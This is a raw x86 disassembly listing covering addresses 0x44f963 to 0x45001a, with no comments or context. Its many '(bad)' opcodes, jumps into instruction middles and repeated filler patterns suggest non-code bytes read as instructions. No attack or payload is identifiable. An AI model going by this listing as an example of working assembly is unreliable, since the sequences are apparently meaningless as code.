  44f963:	add    eax,0x55ff0005
  44f968:	mov    ebx,0xb640ffe6
  44f96d:	loope  0x44f96e
  44f96f:	push   ecx
  44f970:	test   eax,0x3e1bffd2
  44f975:	mov    ds:0x40000ff,eax
  44f97a:	inc    DWORD PTR [eax]
  44f97c:	add    BYTE PTR [eax],dh
  44f97e:	inc    DWORD PTR [eax]
  44f980:	add    BYTE PTR [edx],dh
  44f982:	inc    DWORD PTR [eax]
  44f984:	add    BYTE PTR ds:0x303ff,ch
  44f98a:	jmp    FWORD PTR ds:0x44ffac66
  44f990:	xchg   esi,eax
  44f991:	int3   
  44f992:	jmp    DWORD PTR [ebx]
  44f994:	dec    ebp
  44f995:	xchg   edi,eax
  44f996:	inc    DWORD PTR ds:0xff0004
  44f99c:	add    BYTE PTR [edi],ah
  44f99e:	inc    DWORD PTR [ebx+eax*1]
  44f9a1:	add    bh,bh
  44f9a3:	es push edi
  44f9a5:	pop    edi
  44f9a6:	call   DWORD PTR [ebx-0x4b]
  44f9a9:	in     eax,0xff
  44f9ab:	aaa    
  44f9ac:	add    edi,0xc3650fff
  44f9b2:	call   DWORD PTR [edx+edx*8-0x124c000e]
  44f9b9:	idiv   edi
  44f9bb:	add    eax,DWORD PTR [ebx]
  44f9bd:	add    bh,bh
  44f9bf:	add    al,0x3
  44f9c1:	add    bh,bh
  44f9c3:	xchg   esp,eax
  44f9c4:	mov    ah,0xc6
  44f9c6:	call   FWORD PTR [edi-0x3a]
  44f9c9:	loopne 0x44f9ca
  44f9cb:	inc    edx
  44f9cc:	mov    esi,0x903bffdc
  44f9d1:	into   
  44f9d2:	jmp    DWORD PTR [eax]
  44f9d4:	push   0xffffffbe
  44f9d6:	inc    DWORD PTR [ebx+eax*1]
  44f9d9:	add    bh,bh
  44f9db:	add    DWORD PTR [ecx],eax
  44f9dd:	ud0    eax,DWORD PTR [eax]
  44f9e0:	add    BYTE PTR [eax],ah
  44f9e2:	inc    DWORD PTR [eax]
  44f9e4:	add    BYTE PTR [edx],ah
  44f9e6:	inc    DWORD PTR [ebx+eax*1]
  44f9e9:	add    bh,bh
  44f9eb:	push   cs
  44f9ec:	sub    BYTE PTR [edi+edi*8-0x338fd6],ah
  44f9f3:	sbb    al,0x4a
  44f9f5:	stos   DWORD PTR es:[edi],eax
  44f9f6:	inc    DWORD PTR [eax]
  44f9f8:	add    BYTE PTR [edx],al
  44f9fa:	inc    DWORD PTR [eax]
  44f9fc:	add    BYTE PTR ds:0x260000ff,ah
  44fa02:	inc    DWORD PTR [eax]
  44fa04:	add    BYTE PTR [ecx],ch
  44fa06:	inc    DWORD PTR [ebx]
  44fa08:	add    eax,DWORD PTR [eax]
  44fa0a:	call   DWORD PTR [ecx]
  44fa0c:	sub    dl,BYTE PTR [ebp-0x7addee01]
  44fa12:	jmp    FWORD PTR [eax]
  44fa14:	inc    ebx
  44fa15:	mov    edi,edi
  44fa17:	add    eax,0xff0003
  44fa1c:	add    BYTE PTR [eax],ah
  44fa1e:	inc    DWORD PTR [eax]
  44fa20:	add    BYTE PTR [eax],ah
  44fa22:	inc    DWORD PTR [ebx+eax*1]
  44fa25:	add    bh,bh
  44fa27:	das    
  44fa28:	nop
  44fa29:	scas   al,BYTE PTR es:[edi]
  44fa2a:	jmp    FWORD PTR [eax]
  44fa2c:	ins    BYTE PTR es:[edi],dx
  44fa2d:	into   
  44fa2e:	dec    DWORD PTR [eax+ebp*1]
  44fa31:	lahf   
  44fa32:	push   DWORD PTR [ecx]
  44fa34:	mov    ecx,?
  44fa36:	jmp    FWORD PTR [eax-0x57]
  44fa39:	mov    cl,0xff
  44fa3b:	add    eax,DWORD PTR [ebx]
  44fa3d:	add    bh,bh
  44fa3f:	add    al,0x3
  44fa41:	add    bh,bh
  44fa43:	test   BYTE PTR [edi-0x74e00040],ah
  44fa49:	repz dec DWORD PTR [eax-0x59]
  44fa4d:	(bad)  
  44fa4e:	inc    DWORD PTR [eax-0x68]
  44fa51:	fdiv   st(7),st
  44fa53:	add    eax,0x1ff0005
  44fa58:	add    DWORD PTR [esi],ecx
  44fa5a:	inc    DWORD PTR [eax]
  44fa5c:	add    BYTE PTR [edi+edi*8],bl
  44fa5f:	add    BYTE PTR [eax],al
  44fa61:	sbb    eax,0x1d0000ff
  44fa66:	inc    DWORD PTR [ebx+eax*1]
  44fa69:	add    bh,bh
  44fa6b:	sub    DWORD PTR [ecx-0x56],eax
  44fa6e:	jmp    DWORD PTR [eax+edx*2]
  44fa71:	mov    bh,0xff
  44fa73:	sbb    bh,BYTE PTR [eax]
  44fa75:	lods   al,BYTE PTR ds:[esi]
  44fa76:	inc    DWORD PTR [eax]
  44fa78:	add    DWORD PTR [ecx],ecx
  44fa7a:	inc    DWORD PTR [eax]
  44fa7c:	add    BYTE PTR [edi+edi*8],ah
  44fa7f:	add    BYTE PTR [eax],al
  44fa81:	inc    DWORD PTR es:[eax]
  44fa84:	add    BYTE PTR [esi],ah
  44fa86:	inc    DWORD PTR [ebx]
  44fa88:	add    eax,DWORD PTR [eax]
  44fa8a:	dec    DWORD PTR ds:0x14ffcd25
  44fa90:	sub    ebp,DWORD PTR [ebp-0x1]
  44fa93:	sub    al,BYTE PTR [esi-0x6b]
  44fa96:	inc    DWORD PTR ds:0xff0005
  44fa9c:	add    BYTE PTR [edi],bl
  44fa9e:	inc    DWORD PTR [eax]
  44faa0:	add    BYTE PTR ds:0x1b0000ff,bl
  44faa6:	inc    DWORD PTR [ebx+eax*1]
  44faa9:	add    bh,bh
  44faab:	and    al,0x6d
  44faad:	(bad)  
  44faaf:	(bad)  
  44fab1:	mov    edi,edi
  44fab3:	pop    ss
  44fab4:	inc    ebp
  44fab5:	mov    ah,0xff
  44fab7:	cmp    al,BYTE PTR [ebx+0x303ffa3]
  44fabd:	add    bh,bh
  44fabf:	add    al,0x3
  44fac1:	add    bh,bh
  44fac3:	add    ecx,DWORD PTR [edi]
  44fac5:	imul   edi,edi,0x5
  44fac8:	pop    ss
  44fac9:	into   
  44faca:	call   DWORD PTR [edx]
  44facc:	xor    eax,0x5028ffbb
  44fad1:	mov    dl,0xff
  44fad3:	add    al,0x4
  44fad5:	add    bh,bh
  44fad7:	add    BYTE PTR [eax],al
  44fad9:	pop    ss
  44fada:	inc    DWORD PTR [eax]
  44fadc:	add    BYTE PTR [ecx],bl
  44fade:	inc    DWORD PTR [eax]
  44fae0:	add    BYTE PTR [edx],bl
  44fae2:	inc    DWORD PTR [eax]
  44fae4:	add    BYTE PTR [edx],bl
  44fae6:	inc    DWORD PTR ds:0x3cff0003
  44faec:	pop    esi
  44faed:	(bad)  
  44faee:	jmp    FWORD PTR [ebx]
  44faf0:	dec    eax
  44faf1:	stos   DWORD PTR es:[edi],eax
  44faf2:	jmp    FWORD PTR [eax]
  44faf4:	pop    ebx
  44faf5:	into   
  44faf6:	inc    DWORD PTR [edx]
  44faf8:	push   es
  44faf9:	adc    edi,edi
  44fafb:	add    BYTE PTR [eax],al
  44fafd:	and    edi,edi
  44faff:	add    BYTE PTR [eax],al
  44fb01:	and    bh,bh
  44fb03:	add    BYTE PTR [eax],al
  44fb05:	and    edi,edi
  44fb07:	add    eax,DWORD PTR [ebx]
  44fb09:	add    bh,bh
  44fb0b:	or     BYTE PTR [eax+esi*4],dl
  44fb0e:	call   DWORD PTR [edi]
  44fb10:	cmp    edi,DWORD PTR [edx-0x53badd01]
  44fb16:	inc    DWORD PTR ds:0xff0005
  44fb1c:	add    BYTE PTR [ebx],bl
  44fb1e:	inc    DWORD PTR [eax]
  44fb20:	add    BYTE PTR [ebx],bl
  44fb22:	inc    DWORD PTR [eax]
  44fb24:	add    BYTE PTR [eax],bl
  44fb26:	inc    DWORD PTR [ebx+eax*1]
  44fb29:	add    bh,bh
  44fb2b:	or     al,0x26
  44fb2d:	xchg   esi,eax
  44fb2e:	call   FWORD PTR [edx]
  44fb30:	das    
  44fb31:	fwait
  44fb32:	call   FWORD PTR [eax]
  44fb34:	es cmp bh,0x23
  44fb38:	inc    ecx
  44fb39:	xchg   edi,edi
  44fb3b:	add    eax,DWORD PTR [ebx]
  44fb3d:	add    bh,bh
  44fb3f:	add    al,0x3
  44fb41:	add    bh,bh
  44fb43:	add    DWORD PTR [edx],ecx
  44fb45:	xchg   edi,edi
  44fb47:	pop    es
  44fb48:	daa    
  44fb49:	ret    
  44fb4a:	call   DWORD PTR [ecx]
  44fb4c:	sbb    eax,0x281fffa3
  44fb51:	mov    ds:0x404ff,al
  44fb56:	inc    DWORD PTR [eax]
  44fb58:	add    BYTE PTR ds:0x150000ff,dl
  44fb5e:	inc    DWORD PTR ds:0x5ff0003
  44fb64:	add    eax,DWORD PTR [eax]
  44fb66:	jmp    DWORD PTR [ecx]
  44fb68:	xor    DWORD PTR [ebx-0x56becf01],esi
  44fb6e:	push   DWORD PTR [edx+eax*2]
  44fb71:	lahf   
  44fb72:	call   FWORD PTR [ecx]
  44fb74:	inc    eax
  44fb75:	test   eax,0xb0602ff
  44fb7a:	inc    DWORD PTR [eax]
  44fb7c:	add    BYTE PTR [eax],ah
  44fb7e:	inc    DWORD PTR [eax]
  44fb80:	add    BYTE PTR [edi],bl
  44fb82:	inc    DWORD PTR [eax]
  44fb84:	add    BYTE PTR [eax],ah
  44fb86:	inc    DWORD PTR [ebx]
  44fb88:	add    eax,DWORD PTR [eax]
  44fb8a:	inc    DWORD PTR [ebx]
  44fb8c:	adc    al,0x78
  44fb8e:	inc    DWORD PTR [esi]
  44fb90:	push   ds
  44fb91:	outs   dx,DWORD PTR ds:[esi]
  44fb92:	call   DWORD PTR [edx+esi*1]
  44fb95:	mov    ds:0x505ff,al
  44fb9a:	inc    DWORD PTR [eax]
  44fb9c:	add    BYTE PTR [eax],bl
  44fb9e:	inc    DWORD PTR [eax]
  44fba0:	add    BYTE PTR [edx],bl
  44fba2:	inc    DWORD PTR [eax]
  44fba4:	add    BYTE PTR [esi],dl
  44fba6:	inc    DWORD PTR [ebx+eax*1]
  44fba9:	add    bh,bh
  44fbab:	or     al,0x25
  44fbad:	(bad)  
  44fbae:	jmp    DWORD PTR [edx]
  44fbb0:	xor    DWORD PTR [ebx+0x642320ff],ebp
  44fbb6:	call   FWORD PTR ds:0x3ff8c27
  44fbbc:	add    eax,DWORD PTR [eax]
  44fbbe:	inc    DWORD PTR [ebx+eax*1]
  44fbc1:	add    bh,bh
  44fbc3:	push   es
  44fbc4:	adc    BYTE PTR [esi-0x2caee401],dl
  44fbca:	push   DWORD PTR ds:0x28ffaf50
  44fbd0:	sub    DWORD PTR [ecx+0x404ff],esp
  44fbd6:	inc    DWORD PTR [edx]
  44fbd8:	add    dl,BYTE PTR [esi]
  44fbda:	inc    DWORD PTR [eax]
  44fbdc:	add    BYTE PTR ds:0x202ff,dl
  44fbe2:	inc    DWORD PTR [eax]
  44fbe4:	add    bh,bh
  44fbe6:	inc    DWORD PTR [eax]
  44fbe8:	add    bh,bh
  44fbea:	inc    DWORD PTR [eax]
  44fbec:	add    bh,bh
  44fbee:	inc    DWORD PTR [eax]
  44fbf0:	add    bh,bh
  44fbf2:	inc    DWORD PTR [eax]
  44fbf4:	add    bh,bh
  44fbf6:	inc    DWORD PTR [ecx]
  44fbf8:	add    al,0x1a
  44fbfa:	inc    DWORD PTR [eax]
  44fbfc:	add    BYTE PTR [ebx],bl
  44fbfe:	inc    DWORD PTR [eax]
  44fc00:	add    BYTE PTR [edi+edi*8],bl
  44fc03:	add    BYTE PTR [eax],al
  44fc05:	sbb    al,0xff
  44fc07:	add    eax,DWORD PTR [ebx]
  44fc09:	add    bh,bh
  44fc0b:	sbb    eax,DWORD PTR [esi-0xb]
  44fc0e:	call   DWORD PTR [esi]
  44fc10:	xor    al,0x93
  44fc12:	inc    DWORD PTR [ebx]
  44fc14:	cvtdq2ps xmm7,xmm7
  44fc17:	add    al,0x4
  44fc19:	add    bh,bh
  44fc1b:	add    BYTE PTR [eax],al
  44fc1d:	push   ss
  44fc1e:	inc    DWORD PTR [eax]
  44fc20:	add    BYTE PTR [esi],dl
  44fc22:	inc    DWORD PTR [eax]
  44fc24:	add    BYTE PTR [esi],dl
  44fc26:	inc    DWORD PTR [ebx+eax*1]
  44fc29:	add    bh,bh
  44fc2b:	or     edx,DWORD PTR [esi]
  44fc2d:	jnp    0x44fc2e
  44fc2f:	sbb    DWORD PTR ds:0x271aff70,ebx
  44fc35:	test   edi,edi
  44fc37:	adc    BYTE PTR ds:0x303ffb6,dl
  44fc3d:	add    bh,bh
  44fc3f:	add    al,0x3
  44fc41:	add    bh,bh
  44fc43:	add    eax,DWORD PTR [edi]
  44fc45:	js     0x44fc46
  44fc47:	push   ds
  44fc48:	inc    edx
  44fc49:	mov    bl,0xff
  44fc4b:	xor    al,0x5d
  44fc4d:	mov    edx,0xa4231eff
  44fc52:	inc    DWORD PTR [ebx+eax*1]
  44fc55:	add    bh,bh
  44fc57:	add    BYTE PTR [eax],al
  44fc59:	adc    bh,bh
  44fc5b:	add    BYTE PTR [eax],al
  44fc5d:	adc    edi,edi
  44fc5f:	add    DWORD PTR [ecx],eax
  44fc61:	pop    es
  44fc62:	inc    DWORD PTR [ebx+eax*1]
  44fc65:	add    bh,bh
  44fc67:	push   es
  44fc68:	add    eax,0x506ff00
  44fc6d:	add    bh,bh
  44fc6f:	pop    es
  44fc70:	push   es
  44fc71:	add    bh,bh
  44fc73:	push   es
  44fc74:	add    eax,0x404ff00
  44fc79:	add    bh,bh
  44fc7b:	add    BYTE PTR [eax],al
  44fc7d:	sbb    bh,bh
  44fc7f:	add    BYTE PTR [eax],al
  44fc81:	sbb    edi,edi
  44fc83:	add    BYTE PTR [eax],al
  44fc85:	pop    ss
  44fc86:	inc    DWORD PTR [ebx]
  44fc88:	add    eax,DWORD PTR [eax]
  44fc8a:	call   DWORD PTR [eax]
  44fc8c:	sub    eax,0x211bffb7
  44fc91:	dec    edx
  44fc92:	dec    DWORD PTR [edi]
  44fc94:	adc    dh,BYTE PTR [edx]
  44fc96:	inc    DWORD PTR [esp+eax*1]
  44fc99:	add    bh,bh
  44fc9b:	add    BYTE PTR [eax],al
  44fc9d:	adc    bh,bh
  44fc9f:	add    BYTE PTR [eax],al
  44fca1:	adc    bh,bh
  44fca3:	add    BYTE PTR [eax],al
  44fca5:	adc    bh,bh
  44fca7:	add    al,0x3
  44fca9:	add    bh,bh
  44fcab:	movups XMMWORD PTR [esi],xmm7
  44fcae:	call   DWORD PTR [edi]
  44fcb0:	adc    al,0x32
  44fcb2:	dec    DWORD PTR [ecx]
  44fcb4:	or     eax,0x160fff7f
  44fcb9:	cdq    
  44fcba:	inc    DWORD PTR [ebx]
  44fcbc:	add    eax,DWORD PTR [eax]
  44fcbe:	inc    DWORD PTR [ebx+eax*1]
  44fcc1:	add    bh,bh
  44fcc3:	add    al,0x8
  44fcc5:	mov    bh,bh
  44fcc7:	and    eax,0x3affb940
  44fccc:	push   edi
  44fccd:	cdq    
  44fcce:	jmp    DWORD PTR [eax]
  44fcd0:	and    al,0xa4
  44fcd2:	inc    DWORD PTR ds:0xff0003
  44fcd8:	add    BYTE PTR ds:0xd0000ff,cl
  44fcde:	inc    DWORD PTR [eax]
  44fce0:	add    BYTE PTR ds:0x100000ff,cl
  44fce6:	inc    DWORD PTR [eax]
  44fce8:	add    BYTE PTR [edx],dl
  44fcea:	inc    DWORD PTR [eax]
  44fcec:	add    BYTE PTR [ecx],dl
  44fcee:	inc    DWORD PTR [eax]
  44fcf0:	add    BYTE PTR [ebx],dl
  44fcf2:	inc    DWORD PTR [eax]
  44fcf4:	add    BYTE PTR [edi+edi*8],dl
  44fcf7:	add    BYTE PTR [eax],al
  44fcf9:	adc    al,0xff
  44fcfb:	add    BYTE PTR [eax],al
  44fcfd:	adc    edi,edi
  44fcff:	add    BYTE PTR [eax],al
  44fd01:	adc    al,0xff
  44fd03:	add    BYTE PTR [eax],al
  44fd05:	adc    edi,edi
  44fd07:	add    eax,DWORD PTR [ebx]
  44fd09:	add    bh,bh
  44fd0b:	or     esp,DWORD PTR [ebx]
  44fd0d:	mov    ch,0xff
  44fd0f:	or     al,0x16
  44fd11:	push   edx
  44fd12:	call   FWORD PTR [ecx]
  44fd14:	sbb    DWORD PTR ds:0x405ff,edi
  44fd1a:	inc    DWORD PTR [eax]
  44fd1c:	add    BYTE PTR [edi],cl
  44fd1e:	inc    DWORD PTR [eax]
  44fd20:	add    BYTE PTR [esi],cl
  44fd22:	inc    DWORD PTR [eax]
  44fd24:	add    BYTE PTR [edi+edi*8],cl
  44fd27:	add    al,0x3
  44fd29:	add    bh,bh
  44fd2b:	pop    es
  44fd2c:	or     eax,0x1b1dff46
  44fd31:	cmp    bh,bh
  44fd33:	sbb    DWORD PTR ds:0x903ff98,ebx
  44fd39:	sar    edi,cl
  44fd3b:	add    eax,DWORD PTR [ebx]
  44fd3d:	add    bh,bh
  44fd3f:	add    al,0x3
  44fd41:	add    bh,bh
  44fd43:	or     BYTE PTR [edi],cl
  44fd45:	fwait
  44fd46:	jmp    FWORD PTR [ecx]
  44fd48:	sub    BYTE PTR [edi-0x1],bl
  44fd4b:	xor    DWORD PTR [ecx],esi
  44fd4d:	jns    0x44fd4e
  44fd4f:	and    DWORD PTR [eax],esi
  44fd51:	mov    ds:0xdb1c0cff,al
  44fd56:	inc    DWORD PTR [eax]
  44fd58:	add    DWORD PTR [edx],edx
  44fd5a:	inc    DWORD PTR [eax]
  44fd5c:	add    BYTE PTR [edi+edi*8],cl
  44fd5f:	add    BYTE PTR [eax],al
  44fd61:	or     edi,edi
  44fd63:	add    BYTE PTR [eax],al
  44fd65:	push   cs
  44fd66:	inc    DWORD PTR [eax]
  44fd68:	add    BYTE PTR [eax],dl
  44fd6a:	inc    DWORD PTR [eax]
  44fd6c:	add    BYTE PTR [eax],dl
  44fd6e:	inc    DWORD PTR [eax]
  44fd70:	add    BYTE PTR [edi],cl
  44fd72:	inc    DWORD PTR [eax]
  44fd74:	add    BYTE PTR [eax],dl
  44fd76:	inc    DWORD PTR [eax]
  44fd78:	add    BYTE PTR [ecx],dl
  44fd7a:	inc    DWORD PTR [eax]
  44fd7c:	add    BYTE PTR [eax],dl
  44fd7e:	inc    DWORD PTR [eax]
  44fd80:	add    BYTE PTR [eax],dl
  44fd82:	inc    DWORD PTR [eax]
  44fd84:	add    BYTE PTR [eax],dl
  44fd86:	inc    DWORD PTR [ebx]
  44fd88:	add    eax,DWORD PTR [eax]
  44fd8a:	inc    DWORD PTR [esi+edx*1]
  44fd8d:	xchg   ebp,eax
  44fd8e:	call   DWORD PTR [eax]
  44fd90:	adc    eax,0x1d16ff54
  44fd95:	dec    esi
  44fd96:	inc    DWORD PTR ds:0xff0005
  44fd9c:	add    BYTE PTR ds:0xb0000ff,cl
  44fda2:	inc    DWORD PTR [eax]
  44fda4:	add    BYTE PTR [ecx],cl
  44fda6:	inc    DWORD PTR [ebx+eax*1]
  44fda9:	add    bh,bh
  44fdab:	and    DWORD PTR [edx],ebp
  44fdad:	mov    esi,0x3c262fff
  44fdb2:	jmp    FWORD PTR [edx]
  44fdb4:	sub    edi,DWORD PTR [ecx-0x1]
  44fdb7:	add    eax,0x3ff9f0c
  44fdbc:	add    eax,DWORD PTR [eax]
  44fdbe:	inc    DWORD PTR [ebx+eax*1]
  44fdc1:	add    bh,bh
  44fdc3:	or     DWORD PTR [esi],ecx
  44fdc5:	mov    ?,edi
  44fdc7:	es sbb al,0x3e
  44fdca:	jmp    FWORD PTR [ebx]
  44fdcc:	daa    
  44fdcd:	(bad)  
  44fdce:	call   DWORD PTR [edx]
  44fdd0:	pop    ds
  44fdd1:	test   edi,edi
  44fdd3:	add    eax,0x1ffbd0f
  44fdd8:	add    ah,BYTE PTR [ecx]
  44fdda:	inc    DWORD PTR [ecx]
  44fddc:	add    DWORD PTR [ebx],ecx
  44fdde:	inc    DWORD PTR [eax]
  44fde0:	add    BYTE PTR [ebx],cl
  44fde2:	inc    DWORD PTR [eax]
  44fde4:	add    BYTE PTR [edi+edi*8],cl
  44fde7:	add    BYTE PTR [eax],al
  44fde9:	or     al,0xff
  44fdeb:	add    DWORD PTR [ecx],eax
  44fded:	add    eax,0x303ff
  44fdf2:	inc    DWORD PTR [esp+eax*1]
  44fdf5:	add    bh,bh
  44fdf7:	add    al,0x4
  44fdf9:	add    bh,bh
  44fdfb:	add    DWORD PTR [ecx],eax
  44fdfd:	ud0    eax,DWORD PTR [eax]
  44fe00:	add    BYTE PTR [esi],cl
  44fe02:	inc    DWORD PTR [eax]
  44fe04:	add    BYTE PTR [esi],cl
  44fe06:	inc    DWORD PTR [ebx]
  44fe08:	add    eax,DWORD PTR [eax]
  44fe0a:	inc    DWORD PTR ds:0x14ff6c0e
  44fe10:	adc    edi,DWORD PTR [esi]
  44fe12:	call   FWORD PTR [ebx]
  44fe14:	push   ds
  44fe15:	pusha  
  44fe16:	inc    DWORD PTR ds:0xff0005
  44fe1c:	add    BYTE PTR [ebx],cl
  44fe1e:	inc    DWORD PTR [eax]
  44fe20:	add    BYTE PTR [edx],cl
  44fe22:	inc    DWORD PTR ds:0x1ff0004
  44fe28:	push   es
  44fe29:	cmp    bh,bh
  44fe2b:	adc    eax,0x2affb61b
  44fe30:	push   ds
  44fe31:	dec    ecx
  44fe32:	call   FWORD PTR [edx]
  44fe34:	sbb    al,BYTE PTR [ebx-0x1]
  44fe37:	add    BYTE PTR [eax],al
  44fe39:	(bad)  
  44fe3a:	inc    DWORD PTR [ebx]
  44fe3c:	add    eax,DWORD PTR [eax]
  44fe3e:	inc    DWORD PTR [ebx+eax*1]
  44fe41:	add    bh,bh
  44fe43:	or     BYTE PTR [esi],cl
  44fe45:	pushf  
  44fe46:	jmp    DWORD PTR [esi]
  44fe48:	and    edx,DWORD PTR [edx-0x1]
  44fe4b:	push   ds
  44fe4c:	sbb    eax,0x403ff6f
  44fe51:	inc    DWORD PTR [bx+di]
  44fe54:	or     DWORD PTR [eax-0xffff01],ebx
  44fe5a:	inc    DWORD PTR [esp+eax*1]
  44fe5d:	add    bh,bh
  44fe5f:	add    eax,DWORD PTR [ebx]
  44fe61:	add    bh,bh
  44fe63:	add    eax,DWORD PTR [ebx]
  44fe65:	add    bh,bh
  44fe67:	add    eax,DWORD PTR [ebx]
  44fe69:	add    bh,bh
  44fe6b:	add    eax,DWORD PTR [ebx]
  44fe6d:	add    bh,bh
  44fe6f:	pop    es
  44fe70:	seta   bh
  44fe73:	adc    ah,BYTE PTR [ebx]
  44fe75:	lock inc DWORD PTR [ecx]
  44fe78:	add    ebx,DWORD PTR [eax]
  44fe7a:	inc    DWORD PTR [esi]
  44fe7c:	push   es
  44fe7d:	adc    bh,bh
  44fe7f:	add    BYTE PTR [eax],al
  44fe81:	or     al,0xff
  44fe83:	add    BYTE PTR [eax],al
  44fe85:	or     edi,edi
  44fe87:	add    eax,DWORD PTR [ebx]
  44fe89:	add    bh,bh
  44fe8b:	add    al,0xf
  44fe8d:	mov    edx,0x551714ff
  44fe92:	jmp    FWORD PTR [ecx]
  44fe94:	xor    DWORD PTR [ecx-0xffff01],ecx
  44fe9a:	inc    DWORD PTR [ebx+eax*1]
  44fe9d:	add    bh,bh
  44fe9f:	add    al,0x3
  44fea1:	add    bh,bh
  44fea3:	or     ebx,DWORD PTR [edx+edx*4]
  44fea6:	call   FWORD PTR [ecx+eiz*1]
  44fea9:	lahf   
  44feaa:	call   DWORD PTR [ebx]
  44feac:	adc    al,0x69
  44feae:	call   DWORD PTR [edx]
  44feb0:	pop    ss
  44feb1:	push   0xffffffff
  44feb3:	sbb    eax,0xffad23
  44feb8:	add    bh,bh
  44feba:	inc    DWORD PTR [ebx]
  44febc:	add    eax,DWORD PTR [eax]
  44febe:	inc    DWORD PTR [ebx+eax*1]
  44fec1:	add    bh,bh
  44fec3:	add    BYTE PTR [esi],ah
  44fec5:	(bad)  
  44fec6:	call   DWORD PTR [edx]
  44fec8:	adc    eax,0x130eff90
  44fecd:	xchg   edi,edi
  44fecf:	add    ecx,DWORD PTR [ebx]
  44fed1:	cdq    
  44fed2:	inc    DWORD PTR [eax]
  44fed4:	add    bh,bh
  44fed6:	push   DWORD PTR ds:0x16ff5928
  44fedc:	adc    al,0xb0
  44fede:	call   FWORD PTR [eax]
  44fee0:	push   ds
  44fee1:	ins    DWORD PTR es:[edi],dx
  44fee2:	dec    DWORD PTR ds:0x11ffa41a
  44fee8:	push   ds
  44fee9:	cdq    
  44feea:	call   DWORD PTR [eax]
  44feec:	sbb    DWORD PTR [ecx-0x1],edi
  44feef:	pop    ss
  44fef0:	sub    BYTE PTR [edi-0x25deed01],dh
  44fef6:	inc    DWORD PTR [ecx]
  44fef8:	add    al,0x22
  44fefa:	inc    DWORD PTR [esi]
  44fefc:	add    eax,0xff08
  44ff01:	add    edi,edi
  44ff03:	add    BYTE PTR [eax],al
  44ff05:	add    bh,bh
  44ff07:	add    al,0x4
  44ff09:	add    bh,bh
  44ff0b:	or     DWORD PTR [edi],ecx
  44ff0d:	iret   
  44ff0e:	call   FWORD PTR [ecx]
  44ff10:	sbb    DWORD PTR ds:0xff0000ff,esi
  44ff16:	dec    DWORD PTR [eax]
  44ff18:	push   cs
  44ff19:	jns    0x44ff1a
  44ff1b:	or     ebx,DWORD PTR [eax]
  44ff1d:	cmp    edi,0x1
  44ff20:	push   es
  44ff21:	cdq    
  44ff22:	call   FWORD PTR [ecx]
  44ff24:	sbb    dl,BYTE PTR [ecx-0x1]
  44ff27:	pop    ds
  44ff28:	sbb    al,0x3a
  44ff2a:	call   FWORD PTR [edi+edx*1]
  44ff2d:	xor    edi,edi
  44ff2f:	or     BYTE PTR [esi],cl
  44ff31:	je     0x44ff32
  44ff33:	add    BYTE PTR [eax],al
  44ff35:	(bad)  
  44ff36:	inc    DWORD PTR [ebx]
  44ff38:	add    eax,DWORD PTR [eax]
  44ff3a:	inc    DWORD PTR [eax]
  44ff3c:	add    BYTE PTR [ecx],al
  44ff3e:	inc    DWORD PTR [eax]
  44ff40:	add    BYTE PTR [eax],al
  44ff42:	inc    DWORD PTR [ebx]
  44ff44:	add    eax,DWORD PTR [eax]
  44ff46:	inc    DWORD PTR [eax]
  44ff48:	sub    edi,edi
  44ff4a:	call   DWORD PTR [ebx]
  44ff4c:	pop    ss
  44ff4d:	xchg   ebp,eax
  44ff4e:	call   DWORD PTR [eax]
  44ff50:	adc    cl,al
  44ff52:	jmp    DWORD PTR [ebx+ebx*1]
  44ff55:	aas    
  44ff56:	jmp    FWORD PTR [esi+ebx*1]
  44ff59:	notrack jmp DWORD PTR [esi]
  44ff5c:	pop    ss
  44ff5d:	cmp    bh,0x39
  44ff60:	cs pop esi
  44ff62:	jmp    DWORD PTR ds:0x1bff7627
  44ff68:	and    eax,0x2318ffa1
  44ff6d:	js     0x44ff6e
  44ff6f:	adc    bl,BYTE PTR [edx]
  44ff71:	push   ecx
  44ff72:	call   DWORD PTR [edx]
  44ff74:	and    ebx,edi
  44ff76:	inc    DWORD PTR [ecx]
  44ff78:	add    al,0x27
  44ff7a:	inc    DWORD PTR [esi]
  44ff7c:	push   es
  44ff7d:	push   es
  44ff7e:	inc    DWORD PTR [eax]
  44ff80:	add    BYTE PTR [eax],al
  44ff82:	inc    DWORD PTR [ecx]
  44ff84:	add    DWORD PTR [eax],eax
  44ff86:	inc    DWORD PTR [esi]
  44ff88:	add    eax,0x1e11ff00
  44ff8d:	cmp    bh,0x4
  44ff90:	push   es
  44ff91:	fdivp  st(7),st
  44ff93:	or     BYTE PTR [esp+edi*2],cl
  44ff96:	call   DWORD PTR [ebx]
  44ff98:	push   ss
  44ff99:	xor    eax,0x70110bff
  44ff9e:	call   DWORD PTR [esi]
  44ffa0:	adc    eax,0x262bff87
  44ffa5:	cmp    bh,bh
  44ffa7:	xor    DWORD PTR ds:0x2e27ff58,ebp
  44ffad:	sar    bh,0x0
  44ffb0:	add    bh,bh
  44ffb2:	inc    DWORD PTR [esp+eax*1]
  44ffb5:	add    bh,bh
  44ffb7:	add    BYTE PTR [eax],al
  44ffb9:	add    bh,bh
  44ffbb:	add    BYTE PTR [eax],al
  44ffbd:	add    bh,bh
  44ffbf:	add    BYTE PTR [eax],al
  44ffc1:	add    bh,bh
  44ffc3:	add    BYTE PTR [eax],al
  44ffc5:	add    bh,bh
  44ffc7:	add    eax,DWORD PTR [ebx]
  44ffc9:	add    bh,bh
  44ffcb:	add    BYTE PTR [ecx],dh
  44ffcd:	(bad)  
  44ffce:	jmp    FWORD PTR [ecx]
  44ffd0:	and    eax,0xd0effba
  44ffd5:	imul   edi,edi,0xff342432
  44ffdb:	daa    
  44ffdc:	sbb    BYTE PTR [edi+edi*8+0x21],cl
  44ffe0:	sbb    DWORD PTR [edi+edi*8],edi
  44ffe3:	and    ah,BYTE PTR [edx]
  44ffe5:	dec    edi
  44ffe6:	call   DWORD PTR [edx]
  44ffe8:	pop    ss
  44ffe9:	lods   al,BYTE PTR ds:[esi]
  44ffea:	call   DWORD PTR [edi]
  44ffec:	adc    al,BYTE PTR [ecx-0x1]
  44ffef:	push   ss
  44fff0:	adc    eax,0x2514ff70
  44fff5:	sar    bh,cl
  44fff7:	add    DWORD PTR ds:0x404ff26,eax
  44fffd:	add    al,0xff
  44ffff:	add    BYTE PTR [eax],al
  450001:	add    bh,bh
  450003:	add    al,0x3
  450005:	add    bh,bh
  450007:	or     BYTE PTR [esi],dl
  450009:	(bad)  
  45000b:	adc    bl,BYTE PTR [eax]
  45000d:	cdq    
  45000e:	call   FWORD PTR [edx]
  450010:	sbb    ecx,DWORD PTR [ebp+0x53252eff]
  450016:	jmp    DWORD PTR [ecx]
  450018:	and    DWORD PTR [eax],edi
  45001a:	call   DWORD PTR [edi]
